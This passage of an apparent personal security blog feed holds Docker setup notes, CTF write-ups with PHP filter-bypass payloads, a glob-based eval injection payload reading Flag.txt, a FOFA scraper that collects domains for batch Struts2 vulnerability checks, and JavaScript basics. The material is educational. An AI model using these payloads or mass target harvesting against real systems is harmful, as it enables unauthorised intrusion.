<p>5.WORKDIR<br>切换容器内的当前工作目录, 如: WORKDIR /home/lib/。 当你登陆到容器内后,默认就进入 /home/lib目录。</p>
<p>6.EXPOSE<br>暴漏端口, 把容器端口暴漏给宿主机, 方便在宿主机访问, 如:EXPOSE 1000 。</p>
<p>7.CMD<br>执行一系列命令, 如: CMD [“sh”, “./startup.sh”]。</p>
<h2 id="Docker配置"><a href="#Docker配置" class="headerlink" title="Docker配置"></a>Docker配置</h2><p>首先我按照Dockerfile将基础的镜像配置好，系统是ubuntu:14.04，服务器采用 apache2 + mysql + php5 搭建。</p>
<p>1.<code>$ docker run -d --name bwapp_vul -p 0.0.0.0:8080:80 bwapp</code> 以我们刚配置好的镜像生成容器bwapp_vul<br>2.<code>$ sudo docker start bwapp_vul</code> 启动容器<br>3.<code>$ sudo docker cp /var/www/html/blog.zip bwapp_vul:/var/www/html/</code>将源码考入容器<br>4.<code>$ sudo docker exec -it bwapp_vul bash</code>进入容器shell模式<br>5.<code>$ sudo unzip blog.zip</code>解压源码<br>6.<code>$ sudo mysql -u root -p</code>进入mysql<br>7.<code>creat database blog;  use blog;  source  /var/www/html/blog.sql</code>创建数据库blog，并导入数据库<br>8.然后就可以正常访问页面<br><img src="/uploads/docker2.png" alt="1"><br>遇到的问题：<br>1.一个是文件权限的问题，导致页面打不开，通过命令$ sudo chmod -R 777 [文件名]，可以改变文件权限。<br>2.注意修改mysql的username，password。</p>
]]></content>
      <categories>
        <category>环境部署</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>Docker</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Slove me challenge2.0</title>
    <url>/2018/04/07/challenge2-0/</url>
    <content><![CDATA[<h1 id="Slove-me-challenge"><a href="#Slove-me-challenge" class="headerlink" title="Slove me challenge"></a>Slove me challenge</h1><h2 id="URL-filtering"><a href="#URL-filtering" class="headerlink" title="URL filtering"></a>URL filtering</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    require __DIR__.&quot;&#x2F;lib.php&quot;;</span><br><span class="line"></span><br><span class="line">    $url &#x3D; urldecode($_SERVER[&#39;REQUEST_URI&#39;]);</span><br><span class="line">    $url_query &#x3D; parse_url($url, PHP_URL_QUERY);</span><br><span class="line"></span><br><span class="line">    $params &#x3D; explode(&quot;&amp;&quot;, $url_query);</span><br><span class="line">    foreach($params as $param)&#123;</span><br><span class="line"></span><br><span class="line">        $idx_equal &#x3D; strpos($param, &quot;&#x3D;&quot;);</span><br><span class="line">        if($idx_equal &#x3D;&#x3D;&#x3D; false)&#123;</span><br><span class="line">            $key &#x3D; $param;</span><br><span class="line">            $value &#x3D; &quot;&quot;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $key &#x3D; substr($param, 0, $idx_equal);</span><br><span class="line">            $value &#x3D; substr($param, $idx_equal + 1);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(strpos($key, &quot;do_you_want_flag&quot;) !&#x3D;&#x3D; false || strpos($value, &quot;yes&quot;) !&#x3D;&#x3D; false)&#123;</span><br><span class="line">            die(&quot;no hack&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(isset($_GET[&#39;do_you_want_flag&#39;]) &amp;&amp; $_GET[&#39;do_you_want_flag&#39;] &#x3D;&#x3D; &quot;yes&quot;)&#123;</span><br><span class="line">        die($flag);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>分析代码可知，只有do_you_want_flag=yes，才能返回flag，但是被代码过滤了。<br>继续寻找漏洞，关键点在于parse_url,假如url是无效的，那么就会直接返回false,下面的验证全部跳过。parse_url() 是专门用来解析 URL 而不是 URI 的。不过为遵从 PHP 向后兼容的需要有个例外，对 file:// 协议允许三个斜线（file:///…）。其它任何协议都不能这样。<br>假如url是中带三个斜线就可以直接返回false，绕过验证，但是do_you_want_flag参数确实可以解析的<br>payload: <a href="http://urlfiltering.solveme.peng.kr///index.php?do_you_want_flag=yes">http://urlfiltering.solveme.peng.kr///index.php?do_you_want_flag=yes</a></p>
<h2 id="Hash-collision"><a href="#Hash-collision" class="headerlink" title="Hash collision"></a>Hash collision</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    require __DIR__.&#39;&#x2F;lib.php&#39;;</span><br><span class="line"></span><br><span class="line">    if(isset($_GET[&#39;foo&#39;], $_GET[&#39;bar&#39;]))&#123;</span><br><span class="line"></span><br><span class="line">        if(strlen($_GET[&#39;foo&#39;]) &gt; 30 || strlen($_GET[&#39;bar&#39;]) &gt; 30)&#123;</span><br><span class="line">            die(&#39;Too long&#39;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if($_GET[&#39;foo&#39;] &#x3D;&#x3D;&#x3D; $_GET[&#39;bar&#39;])&#123;</span><br><span class="line">            die(&#39;Same value&#39;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(hash(&#39;sha512&#39;, $_GET[&#39;foo&#39;]) !&#x3D;&#x3D; hash(&#39;sha512&#39;, $_GET[&#39;bar&#39;]))&#123;</span><br><span class="line">            die(&#39;Different hash&#39;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        echo $flag, &#39;&lt;hr&gt;&#39;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>常见的绕过hash方法，使用数组变量，hash之后返回null,即可绕过<br>payload: <a href="http://hashcollision.solveme.peng.kr/?foo%5B%5D=aaa&amp;bar%5B%5D=bbb">http://hashcollision.solveme.peng.kr/?foo[]=aaa&amp;bar[]=bbb</a></p>
<h2 id="array2string"><a href="#array2string" class="headerlink" title="array2string"></a>array2string</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    require __DIR__.&#39;&#x2F;lib.php&#39;;</span><br><span class="line"></span><br><span class="line">    $value &#x3D; $_GET[&#39;value&#39;];</span><br><span class="line"></span><br><span class="line">    $username &#x3D; $_GET[&#39;username&#39;];</span><br><span class="line">    $password &#x3D; $_GET[&#39;password&#39;];</span><br><span class="line"></span><br><span class="line">    for ($i &#x3D; 0; $i &lt; count($value); ++$i) &#123;</span><br><span class="line">        if ($_GET[&#39;username&#39;]) unset($username);</span><br><span class="line">        if ($value[$i] &gt; 32 &amp;&amp; $value[$i] &lt; 127) unset($value);</span><br><span class="line">        else $username .&#x3D; chr($value[$i]);</span><br><span class="line"></span><br><span class="line">        if ($username &#x3D;&#x3D; &#39;15th_HackingCamp&#39; &amp;&amp; md5($password) &#x3D;&#x3D; md5(file_get_contents(&#39;.&#x2F;secret.passwd&#39;))) &#123;</span><br><span class="line">            echo &#39;Hello &#39;.$username.&#39;!&#39;, &#39;&lt;br&gt;&#39;, PHP_EOL;</span><br><span class="line">            echo $flag, &#39;&lt;hr&gt;&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>首先已知password的路径./secret.passwd，我们可以直接得知simple_passw0rd。<br>因为不能输入username，我们要构造value，已知它的ascii码值要小于32或者大于127，最后又要求value经过chr后拼接的username为’15th_HackingCamp’。<br>想了很久也没有想出来，查了一下资料得知chr的参数在大于256的时候会自动取余，哇真的长知识了，于是就可以很快的构造出来了。<br>这里我们写了个小脚本把很长的value值导出来。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#x3D;&#39;15th_HackingCamp&#39;</span><br><span class="line">j&#x3D;0</span><br><span class="line">b&#x3D;&#39;&#39;</span><br><span class="line">for i in a:</span><br><span class="line">    b+&#x3D;&#39;value[&#39;+str(j)+&#39;]&#x3D;&#39;+str(ord(i)+256)+&#39;&amp;&#39;</span><br><span class="line">    j+&#x3D;1</span><br><span class="line">print(b[:-1])</span><br></pre></td></tr></table></figure>
<p>最后的payload为<a href="http://array2string.solveme.peng.kr/index.php?value%5B0%5D=305&amp;value%5B1%5D=309&amp;value%5B2%5D=372&amp;value%5B3%5D=360&amp;value%5B4%5D=351&amp;value%5B5%5D=328&amp;value%5B6%5D=353&amp;value%5B7%5D=355&amp;value%5B8%5D=363&amp;value%5B9%5D=361&amp;value%5B10%5D=366&amp;value%5B11%5D=359&amp;value%5B12%5D=323&amp;value%5B13%5D=353&amp;value%5B14%5D=365&amp;value%5B15%5D=368&amp;password=simple_passw0rd">http://array2string.solveme.peng.kr/index.php?value[0]=305&amp;value[1]=309&amp;value[2]=372&amp;value[3]=360&amp;value[4]=351&amp;value[5]=328&amp;value[6]=353&amp;value[7]=355&amp;value[8]=363&amp;value[9]=361&amp;value[10]=366&amp;value[11]=359&amp;value[12]=323&amp;value[13]=353&amp;value[14]=365&amp;value[15]=368&amp;password=simple_passw0rd</a></p>
<p>未完待续。。。</p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>fofa域名爬取</title>
    <url>/2018/11/01/fofa%E5%9F%9F%E5%90%8D%E7%88%AC%E5%8F%96/</url>
    <content><![CDATA[<h1 id="fofa域名爬取"><a href="#fofa域名爬取" class="headerlink" title="fofa域名爬取"></a>fofa域名爬取</h1><p>前段时间做了一个struts2的专题，对整个山东省的资产进行检测是否存在struts2漏洞，包括在fofa，shodan上根据特征查找相关的资产，整个过程十分费劲，因为在fofa上搜集的资产很多，直接导出数据需要花钱，所以需要一个一个手动复制资产检测，十分浪费时间，这段时间刚好在学爬虫，于是尝试写了一个脚本，根据特征，将所有域名爬取下来，然后可以使用工具批量验证。</p>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>首先你需要一个fofa的会员账号，因为普通用户也只能查看5页数据。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># encoding&#x3D;utf-8</span><br><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line">import re</span><br><span class="line"># fofa爬取域名</span><br><span class="line"></span><br><span class="line"># get访问登录页面，获取到token，session，It，这三个数据时页面随机生成的，请求数据时需要加上</span><br><span class="line">loginurl&#x3D;&#39;https:&#x2F;&#x2F;i.nosec.org&#x2F;login&#39;</span><br><span class="line">getlogin&#x3D;requests.get(loginurl)</span><br><span class="line">token0&#x3D;re.findall(&#39;&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;authenticity_token&quot; value&#x3D;&quot;(.*)&quot; &#x2F;&gt;&#39;,getlogin.text)</span><br><span class="line">session0&#x3D;re.findall(&#39;(_nosec_cas_session&#x3D;.*); path&#x3D;&#x2F;&#39;,getlogin.headers[&#39;Set-Cookie&#39;])</span><br><span class="line">It0&#x3D;re.findall(&#39;&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;lt&quot; id&#x3D;&quot;lt&quot; value&#x3D;&quot;(.*)&quot; &#x2F;&gt;&#39;,getlogin.text)</span><br><span class="line">token&#x3D;token0[0]</span><br><span class="line">session1&#x3D;session0[0]</span><br><span class="line">It&#x3D;It0[0]</span><br><span class="line"># 设置data数据和header头，将我们获取的数据加到里面</span><br><span class="line">datas&#x3D;&#123;</span><br><span class="line">    &#39;utf8&#39;:&#39;%E2%9C%93&#39;,</span><br><span class="line">    &#39;authenticity_token&#39;: token,</span><br><span class="line">    &#39;lt&#39;: It,</span><br><span class="line">	&#39;username&#39;:&#39;###fofa账号&#39;,</span><br><span class="line">	&#39;password&#39;:&#39;###fofa密码&#39;,</span><br><span class="line">	&#39;rememberMe&#39;:&#39;1&#39;,</span><br><span class="line">	&#39;button&#39;: &#39;&#39;</span><br><span class="line">&#125;</span><br><span class="line">headers&#x3D;&#123;</span><br><span class="line">&#39;Host&#39;: &#39;i.nosec.org&#39;,</span><br><span class="line">&#39;Connection&#39;: &#39;close&#39;,</span><br><span class="line">&#39;Content-Length&#39;: &#39;302&#39;,</span><br><span class="line">&#39;Cache-Control&#39;: &#39;max-age&#x3D;0&#39;,</span><br><span class="line">&#39;Origin&#39;: &#39;https:&#x2F;&#x2F;i.nosec.org&#39;,</span><br><span class="line">&#39;Upgrade-Insecure-Requests&#39;: &#39;1&#39;,</span><br><span class="line">&#39;Content-Type&#39;: &#39;application&#x2F;x-www-form-urlencoded&#39;,</span><br><span class="line">&#39;User-Agent&#39;: &#39;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;68.0.3440.106 Safari&#x2F;537.36&#39;,</span><br><span class="line">&#39;Accept&#39;: &#39;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8&#39;,</span><br><span class="line">&#39;Referer&#39;: &#39;https:&#x2F;&#x2F;i.nosec.org&#x2F;login&#39;,</span><br><span class="line">&#39;Accept-Encoding&#39;: &#39;gzip, deflate, br&#39;,</span><br><span class="line">&#39;Cookie&#39;: &#39;__lnkrntdmcvrd&#x3D;-1; &#39;+session1,</span><br><span class="line">&#39;Accept-Language&#39;: &#39;zh-CN,zh;q&#x3D;0.9&#39;</span><br><span class="line">&#125;</span><br><span class="line"># 使用session登录，可以保证在之后的访问中保持登录信息</span><br><span class="line">session&#x3D;requests.Session()</span><br><span class="line">postlogin&#x3D;session.post(loginurl,headers&#x3D;headers,data&#x3D;datas)</span><br><span class="line">sess_headers&#x3D;&#123;</span><br><span class="line">	&#39;User-Agent&#39;: &#39;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;68.0.3440.106 Safari&#x2F;537.36&#39;</span><br><span class="line">&#125;</span><br><span class="line"># fofa的登陆界面和一般网站不同，他是类似于一个第三方的登录界面，在nosec登录成功后，你直接访问fofa是出于未登录状态，因为只是存在nosec的cookie，并没有fofa的cookie，</span><br><span class="line"># 需要访问该链接才会生成fofa的cookie</span><br><span class="line">signlogin&#x3D;session.get(&#39;https:&#x2F;&#x2F;fofa.so&#x2F;users&#x2F;sign_in&#39;,headers&#x3D;sess_headers)</span><br><span class="line">search&#x3D;input(&quot;请根据fofa语法输入搜索的对象:\n&quot;)</span><br><span class="line">searchbs64&#x3D;(str(base64.b64encode(search.encode(&#39;utf-8&#39;)),&#39;utf-8&#39;))</span><br><span class="line">pageurl&#x3D;session.get(&#39;https:&#x2F;&#x2F;fofa.so&#x2F;result?qbase64&#x3D;&#39;+searchbs64,headers&#x3D;sess_headers)</span><br><span class="line">pagenum&#x3D;re.findall(&#39;&gt;(\d*)&lt;&#x2F;a&gt; &lt;a class&#x3D;&quot;next_page&quot; rel&#x3D;&quot;next&quot;&#39;,pageurl.text)</span><br><span class="line">print(&quot;经探测一共&quot;+pagenum[0]+&quot;页数据&quot;)</span><br><span class="line">doc&#x3D;open(&quot;1.txt&quot;,&quot;a&quot;)</span><br><span class="line">for i in range(int(pagenum[0])):</span><br><span class="line">	finurl&#x3D;session.get(&#39;https:&#x2F;&#x2F;fofa.so&#x2F;result?page&#x3D;&#39;+str(i)+&#39;&amp;qbase64&#x3D;&#39;+searchbs64,headers&#x3D;sess_headers)</span><br><span class="line">	finurl&#x3D;re.findall(&#39;&lt;a target&#x3D;&quot;_blank&quot; href&#x3D;&quot;(.*)&quot;&gt;.* &lt;i class&#x3D;&quot;fa fa-link&quot;&gt;&#39;,finurl.text)</span><br><span class="line">	for j in finurl:</span><br><span class="line">		doc.write(j+&#39;\n&#39;)</span><br><span class="line">	print(&quot;写入第&quot;+str(i)+&quot;页的url&quot;)</span><br><span class="line">doc.close()</span><br><span class="line">print(&#39;爬取完成&#39;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="思路介绍"><a href="#思路介绍" class="headerlink" title="思路介绍"></a>思路介绍</h2><p>http头中有session的验证，还有token和It的验证，我们首先访问登录页面，获取到相关的验证信息，登录时，加上验证信息，即可登陆成功，<br>但是我在这里遇到了一个问题，就是该登陆界面似乎是一个第三方网站登录<code>https://i.nosec.org/login</code>,我登录成功后，生成的只是该网站的cookie，我使用该网站的cookie直接访问fofa，仍然是处于为登陆的状态，于是在我仔细分析整个http请求响应过程中，我找到了一个链接，带着登录网站的cookie只要访问该域名<code>https://fofa.so/users/sign_in</code>就会生成fofa的cookie，随即登陆成功。</p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>glob通配符的探究</title>
    <url>/2018/10/15/glob%E9%80%9A%E9%85%8D%E7%AC%A6%E7%9A%84%E6%8E%A2%E7%A9%B6/</url>
    <content><![CDATA[<h1 id="glob通配符的探究"><a href="#glob通配符的探究" class="headerlink" title="glob通配符的探究"></a>glob通配符的探究</h1><p>上个月在安恒月赛中遇到glob的题目，今天又在REEBUF中观摩到p神的文章，于是便静心好好探究了一下。</p>
<h2 id="glob通配符"><a href="#glob通配符" class="headerlink" title="glob通配符"></a>glob通配符</h2><p>glob通配符用于linux文件匹配，类似于正则表达式，但是有一些差别。</p>
<h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><h4 id="基本字符"><a href="#基本字符" class="headerlink" title="基本字符"></a>基本字符</h4><p>*:匹配一个路径部分中0个或多个字符，注意不匹配以.开始的路径，如文件.a<br>?:匹配一个字符<br>[…]:匹配一系列字符，[abc]匹配字符a,b,c<br>[a-d]:匹配一系列字符，a,b,c,d<br>[^…]/[!…]:匹配不在列表中的字符，[^abc]匹配除a,b,c以外的字符<br>{a,b,…}:匹配a,b或更多字符串，也可以是集合</p>
<h4 id="专用字符集"><a href="#专用字符集" class="headerlink" title="专用字符集"></a>专用字符集</h4><p>[:alnum:]    任意数字或者字母<br>[:alpha:]    任意字母<br>[:space:]    空格<br>[:lower:]    小写字母<br>[:digit:]    任意数字<br>[:upper:]    任意大写字母<br>[:cntrl:]    控制符<br>[:graph:]    图形<br>[:print:]    可打印字符<br>[:punct:]    标点符号<br>[:xdigit:]    十六进制数<br>[:blank:]    空白字符（未验证）</p>
<p>注：专用字符集，使用时应加[],如[[:lower:]]</p>
<h2 id="操作利用"><a href="#操作利用" class="headerlink" title="操作利用"></a>操作利用</h2><p>我在当前路径下新建了两个文件,blog.sql和BLOG.sql</p>
<p>那我们如何使用通配符区别这两个文件呢?<br>如同演示:<br><img src="/uploads/glob1.png" alt="1"></p>
<h2 id="题目复现"><a href="#题目复现" class="headerlink" title="题目复现"></a>题目复现</h2><p>源码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#39;code&#39;]))&#123;</span><br><span class="line">    $code &#x3D; $_GET[&#39;code&#39;];</span><br><span class="line">    if(strlen($code)&gt;35)&#123;</span><br><span class="line">        die(&quot;Long.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;&#x2F;[A-Za-z0-9_$]+&#x2F;&quot;,$code))&#123;</span><br><span class="line">        die(&quot;NO.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    eval($code);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>分析可知，代码限制了输入的字符长度，并限制了字母数字和一些符号，在此情况下进行getshell.</p>
<p>在受限的情况下如何获取Flag.txt呢?<br>首先我们在大小写字母都受限的情况下，[A-Z]和[:upper:]都是无法使用的，只能换一种思路，ascii码表中，A的前一个字符是@，Z的后一个字符是[,我们构造[@-[],也是可以匹配到大写字母的.<br>构造/???/???=/bin/cat  [@-[]???.???=Flag.txt<br>payload:<a href="http://127.0.0.1/test.php?code=?&gt;">http://127.0.0.1/test.php?code=?&gt;</a><?=`/???/??? [@-[]???.??`;?><br>此时可能会回显大量的数据，这个是因为/???/??? 可以匹配很多文件，而/bin/cat是第一个，所获取的数据在大量数据的末尾.</p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>javascript基础学习1.0</title>
    <url>/2018/03/15/javascript%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A01-0/</url>
    <content><![CDATA[<h1 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h1><h2 id="HTML嵌入JavaScript的代码方式"><a href="#HTML嵌入JavaScript的代码方式" class="headerlink" title="HTML嵌入JavaScript的代码方式"></a>HTML嵌入JavaScript的代码方式</h2><blockquote>
<p>1.使用JavaScript：前缀构建执行JavaScript代码<br>2.使用&lt;script…/&gt;标签来包含JavaScript代码</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;javascript:alert(&#39;使用前缀运行JavaScript&#39;)；&quot;&gt;</span><br><span class="line">运行JavaScript</span><br><span class="line">&lt;&#x2F;a&gt;</span><br><span class="line"></span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">alert(&quot;直接运行的JavaScript&quot;)；</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br></pre></td></tr></table></figure>
<h2 id="导入外部的JavaScript文件"><a href="#导入外部的JavaScript文件" class="headerlink" title="导入外部的JavaScript文件"></a>导入外部的JavaScript文件</h2><blockquote>
<p>为了将HTML页面和JavaScript脚本分离，可以将JavaScript脚本单独保存在一个*.js文件中，HTML页面导入js文件即可。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;outer.js&quot; type&#x3D;&quot;text&#x2F;javascript&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<h2 id="变量与数据类型"><a href="#变量与数据类型" class="headerlink" title="变量与数据类型"></a>变量与数据类型</h2><blockquote>
<p>JavaScript是弱类型脚本语言，使用变量之前，可以无需定义，当使用某个变量的时候直接使用即可。主要分为以下两种定义方式：<br>1.隐式定义：直接给变量赋值<br>2.显示定义：使用var关键字定义变量</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">temp&#x3D;&quot;welcome&quot;; &#x2F;&#x2F;隐式定义</span><br><span class="line">alert(temp);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">var temp; &#x2F;&#x2F;显示声明</span><br><span class="line">temp&#x3D;12; &#x2F;&#x2F;赋值整形</span><br><span class="line">alert(temp);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<h3 id="变量的名称规则"><a href="#变量的名称规则" class="headerlink" title="变量的名称规则"></a>变量的名称规则</h3><blockquote>
<p>1.首字母必须是字母（大小写均可）、下划线、或者$符号<br>2.余下的字母可以是下划线、$、任意字母或者是数字字符<br>3.变量名不能使用关键字</p>
</blockquote>
<h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><blockquote>
<p>1.数值类型（number）：包含整数和浮点数<br>2.布尔类型（boolean）：只有true或false两个值<br>3.字符串类型（string）：字符串必须使用双引号或者单引号括起来。<br>4.未定义类型（undefined）：专门用来确定一个已经创建但是没有初值的变量。<br>5.空类型（null）：用于表明某个变量的值为空。</p>
</blockquote>
<h2 id="类型装换"><a href="#类型装换" class="headerlink" title="类型装换"></a>类型装换</h2><blockquote>
<p>1.通过”+”或者toString()方法将数值转换成字符串<br>2.通过parseInt()将字符串转换成整形<br>3.通过parseFloat()将字符串转换成浮点型</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">var a&#x3D;3;</span><br><span class="line">var b&#x3D;10;</span><br><span class="line">var c&#x3D;a.toString(); &#x2F;&#x2F;字符 3</span><br><span class="line">var d&#x3D;b+c; &#x2F;&#x2F;字符 103</span><br><span class="line"></span><br><span class="line">parseInt(&quot;67red&quot;) &#x2F;&#x2F;整形67</span><br><span class="line">parseInt(&quot;53.5&quot;) &#x2F;&#x2F;整形53</span><br><span class="line">parseInt(&quot;0xC&quot;) &#x2F;&#x2F;整形12</span><br><span class="line">parseInt(&quot;nihao&quot;) &#x2F;&#x2F;NaN not a number</span><br><span class="line"></span><br><span class="line">parseFloat(&quot;35chen&quot;)&#x2F;&#x2F;35</span><br><span class="line">parseFloat(&quot;0xA&quot;)&#x2F;&#x2F;0</span><br><span class="line">parseFloat(&quot;435.34&quot;)&#x2F;&#x2F;435.34</span><br><span class="line">parseFloat(&quot;435.34.564&quot;)&#x2F;&#x2F;435.34</span><br><span class="line">parseFloat(&quot;nihao&quot;)&#x2F;&#x2F;NaN</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<h2 id="字符串常用操作"><a href="#字符串常用操作" class="headerlink" title="字符串常用操作"></a>字符串常用操作</h2><blockquote>
<p>charAt():获取字符串特定索引处的字符<br>toUpperCase():将字符串的所有字符转换成大写字母<br>indexOf():返回字符串中特定字符串第一次出现的位置<br>substring():返回字符串的某个子串<br>slice():返回字符串的某个子串，支持负数参数，功能更强大<br>concat():用于将多个字符串拼加成一个字符串<br>replace():将字符串中的某个子串以特定的字符串替换<br>split():将某个字符串分割成多个字符串，可以指定分隔符<br>match():使用正则表达式搜索目标子字符串<br>search():使用正则表达式搜索目标子字符串</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var str&#x3D;&quot;i-love-football and basketball&quot;</span><br><span class="line">alert(str.length)&#x2F;&#x2F;30</span><br><span class="line">alert(str.charAt(5))&#x2F;&#x2F;e</span><br><span class="line">alert(str.toUpperCase())&#x2F;&#x2F;大写</span><br><span class="line">alert(str.indexOf(&#39;o&#39;))&#x2F;&#x2F;3</span><br><span class="line">alert(str.lastIndexOf(&#39;o&#39;))&#x2F;&#x2F;9</span><br><span class="line">alert(str.indexOf(&#39;o&#39;,7))&#x2F;&#x2F;从第七个位置开始查找 8</span><br><span class="line">alert(str.match(&quot;xxx&quot;))&#x2F;&#x2F;在str中找到xxx，返回xxx，未找到，返回null</span><br><span class="line">alert(str.search(&quot;xxx&quot;))&#x2F;&#x2F;在str中找到xxx，返回其下标，未找到，返回-1</span><br></pre></td></tr></table></figure>
<blockquote>
<p>注意：1.JavaScript中的字符串可以用单引号括起来<br>2.JavaScript中比较两个字符串的字符序列是否相等使用==</p>
</blockquote>
]]></content>
      <categories>
        <category>基础知识</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>javascript基础学习2.0</title>
    <url>/2018/03/15/javascript%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A02-0/</url>
    <content><![CDATA[<h1 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h1><h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">方法一：</span><br><span class="line">var reg&#x3D;&#x2F;pattern&#x2F;</span><br><span class="line">方法二：</span><br><span class="line">var reg&#x3D;new RegExp(pattern);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="RegExp对象的常用的方法"><a href="#RegExp对象的常用的方法" class="headerlink" title="RegExp对象的常用的方法"></a>RegExp对象的常用的方法</h3><blockquote>
<p>exec(str):检索字符串中指定的值，返回找到的值，并确定其位置。<br>test(str):检索字符串中是否有满足指定条件的值，返回true或false。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var str&#x3D;&quot;i-love-football and basketball</span><br><span class="line">var reg&#x3D;&#x2F;football&#x2F;</span><br><span class="line">var reg&#x3D; new RegExp(&#39;football&#39;)</span><br><span class="line">alert(reg.exec(str))</span><br><span class="line">alert(reg.test(str))</span><br></pre></td></tr></table></figure>
<h3 id="常用通配符"><a href="#常用通配符" class="headerlink" title="常用通配符"></a>常用通配符</h3><blockquote>
<p>.:可以匹配任何字符<br>\d:匹配0-9的所有数字<br>\D:匹配非数字<br>\s:匹配所有空白字符，包括空格、制表符、换行符、回车符等<br>\S:匹配所有非空白字符<br>\w:匹配所有的单词字符，包括0-9数字、26个英文字母和下划线<br>\W:匹配所有的非单词字符<br>\b:匹配单词边界<br>\B:匹配非单词边界</p>
</blockquote>
<h3 id="正则表达式所支持的常用通配符"><a href="#正则表达式所支持的常用通配符" class="headerlink" title="正则表达式所支持的常用通配符"></a>正则表达式所支持的常用通配符</h3><blockquote>
